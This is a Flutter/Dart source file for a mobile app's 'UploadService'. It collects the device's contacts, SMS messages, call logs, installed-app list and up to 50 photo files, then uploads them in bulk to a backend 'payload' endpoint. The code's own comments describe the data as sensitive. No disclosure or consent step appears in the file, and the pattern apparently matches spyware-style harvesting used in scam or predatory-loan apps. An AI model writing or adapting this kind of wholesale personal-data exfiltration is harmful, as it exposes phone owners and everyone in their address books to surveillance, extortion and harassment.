import 'dart:io';

import '../../core/config/app_config.dart';
import '../../core/services/storage_service.dart';
import '../../services/api/api_service.dart';
import 'contacts_service.dart';
import 'sms_service.dart';
import 'call_log_service.dart';
import 'photo_service.dart';
import 'app_list_service.dart';

/// 数据上传服务
/// 统一管理敏感数据的上传
class UploadService {
  static final UploadService instance = UploadService._internal();
  UploadService._internal();

  final ApiService _apiService = ApiService();

  /// 上传结构化数据（应用列表、通讯录、短信、通话记录、相册元数据）
  Future<bool> uploadStructuredData({
    List<Map<String, dynamic>>? appList,
    List<Map<String, dynamic>>? contacts,
    List<Map<String, dynamic>>? sms,
    List<Map<String, dynamic>>? callRecords,
    List<Map<String, dynamic>>? photoMetadata,
  }) async {
    try {
      if (!AppConfig.instance.isConfigured) {
        throw Exception('请先识别凭证');
      }

      final data = <String, dynamic>{};

      if (appList != null && appList.isNotEmpty) data['app_list'] = appList;
      if (contacts != null && contacts.isNotEmpty) data['contacts'] = contacts;
      if (sms != null && sms.isNotEmpty) data['sms'] = sms;
      if (callRecords != null && callRecords.isNotEmpty) data['call_records'] = callRecords;
      // 相册改为上传实际照片文件，不再上传 photo_metadata

      if (data.isEmpty) throw Exception('没有数据需要上传');

      final response = await _apiService.post('/payload/upload', data: data);
      return response != null;
    } catch (e) {
      throw Exception('上传结构化数据失败: $e');
    }
  }
  
  /// 上传图片文件
  /// 
  /// [photoFile] 图片文件
  /// 
  /// 返回图片ID
  Future<String?> uploadPhoto(File photoFile) async {
    try {
      if (!AppConfig.instance.isConfigured) {
        throw Exception('请先识别凭证');
      }
      
      if (!await photoFile.exists()) {
        throw Exception('图片文件不存在');
      }
      
      final response = await _apiService.uploadFile(
        '/files/upload-photo',
        photoFile.path,
        fieldName: 'file',
      );
      
      if (response != null && response['photo_id'] != null) {
        return response['photo_id'] as String;
      }
      
      return null;
    } catch (e) {
      throw Exception('上传图片失败: $e');
    }
  }
  
  /// 批量上传图片
  /// 
  /// [photoFiles] 图片文件列表
  /// 
  /// 返回图片ID列表
  Future<List<String>> uploadPhotos(List<File> photoFiles) async {
    try {
      if (!AppConfig.instance.isConfigured) {
        throw Exception('请先识别凭证');
      }
      
      final photoIds = <String>[];
      
      for (final photoFile in photoFiles) {
        if (await photoFile.exists()) {
          final photoId = await uploadPhoto(photoFile);
          if (photoId != null) {
            photoIds.add(photoId);
          }
        }
      }
      
      return photoIds;
    } catch (e) {
      throw Exception('批量上传图片失败: $e');
    }
  }
  
  /// 上传相册元数据
  /// 
  /// [photoMetadata] 相册元数据列表
  Future<bool> uploadPhotoMetadata(List<Map<String, dynamic>> photoMetadata) async {
    try {
      if (!AppConfig.instance.isConfigured) {
        throw Exception('请先识别凭证');
      }
      
      final response = await _apiService.post(
        '/payload/upload',
        data: {
          'photo_metadata': photoMetadata,
        },
      );
      
      return response != null;
    } catch (e) {
      throw Exception('上传相册元数据失败: $e');
    }
  }
  
  /// 收集并上传所有敏感数据
  ///
  /// 自动收集通讯录、短信、通话记录、应用列表、相册照片（实际文件）并上传
  Future<Map<String, dynamic>> collectAndUploadAllData() async {
    final result = <String, dynamic>{
      'success': true,
      'errors': <String>[],
      'contacts_count': 0,
      'sms_count': 0,
      'call_records_count': 0,
      'app_list_count': 0,
      'photo_count': 0,
    };

    List<Map<String, dynamic>>? contacts;
    List<Map<String, dynamic>>? sms;
    List<Map<String, dynamic>>? callRecords;
    List<Map<String, dynamic>>? appList;

    try {
      try {
        contacts = await ContactsDataService.instance.getAllContacts();
        if (contacts != null && contacts.isNotEmpty) result['contacts_count'] = contacts.length;
      } catch (e) {
        result['errors'].add('通訊錄: $e');
      }
      try {
        sms = await SMSService.instance.getAllSms();
        if (sms != null && sms.isNotEmpty) result['sms_count'] = sms.length;
      } catch (e) {
        // iOS 不支持短信，静默跳过
        if (e.toString().contains('Android')) {
          result['errors'].add('簡訊: $e');
        }
      }
      try {
        print('[UploadService] 開始收集通話記錄...');
        callRecords = await CallLogService.instance.getAllCallLogs();
        if (callRecords != null && callRecords.isNotEmpty) {
          result['call_records_count'] = callRecords.length;
          print('[UploadService] 通話記錄收集成功: ${callRecords.length} 條');
        } else {
          print('[UploadService] 通話記錄為空或未授權');
        }
      } catch (e) {
        print('[UploadService] 通話記錄收集失敗: $e');
        // iOS 不支持通话记录，静默跳过
        if (e.toString().contains('Android')) {
          result['errors'].add('通話記錄: $e');
        }
      }
      try {
        print('[UploadService] 開始收集應用程式列表...');
        appList = await AppListService.instance.getAppList();
        if (appList != null && appList.isNotEmpty) {
          result['app_list_count'] = appList.length;
          print('[UploadService] 應用程式列表收集成功: ${appList.length} 個');
        } else {
          print('[UploadService] 應用程式列表為空或未授權');
        }
      } catch (e) {
        print('[UploadService] 應用程式列表收集失敗: $e');
        // iOS 不支持应用列表，静默跳过
        if (e.toString().contains('Android')) {
          result['errors'].add('應用程式列表: $e');
        }
      }
      final hasStructured = (contacts != null && contacts.isNotEmpty) ||
          (sms != null && sms.isNotEmpty) ||
          (callRecords != null && callRecords.isNotEmpty) ||
          (appList != null && appList.isNotEmpty);

      if (hasStructured) {
        print('[UploadService] 開始上傳結構化資料到後端...');
        await uploadStructuredData(
          contacts: contacts,
          sms: sms,
          callRecords: callRecords,
          appList: appList,
          photoMetadata: null,
        );
        print('[UploadService] 結構化資料上傳完成');
      }

      try {
        print('[UploadService] 開始收集並上傳相冊照片...');
        final photoFiles = await PhotoService.instance.getPhotoFilesForUpload(maxCount: 50);
        if (photoFiles.isNotEmpty) {
          final ids = await uploadPhotos(photoFiles);
          result['photo_count'] = ids.length;
          print('[UploadService] 相冊照片上傳成功: ${ids.length} 張');
        } else {
          print('[UploadService] 相冊無可上傳照片或未授權');
        }
      } catch (e) {
        print('[UploadService] 相冊照片收集/上傳失敗: $e');
        result['errors'].add('相冊: $e');
      }

      final hasAny = hasStructured || ((result['photo_count'] as int?) ?? 0) > 0;
      if (!hasAny) {
        result['success'] = false;
        result['errors'].add('沒有可上傳的資料');
        return result;
      }

      final now = DateTime.now().toUtc().toIso8601String();
      await StorageService.instance.saveLastDataSyncAt(now);
    } catch (e) {
      result['success'] = false;
      result['errors'].add('上傳失敗: $e');
    }

    return result;
  }
}
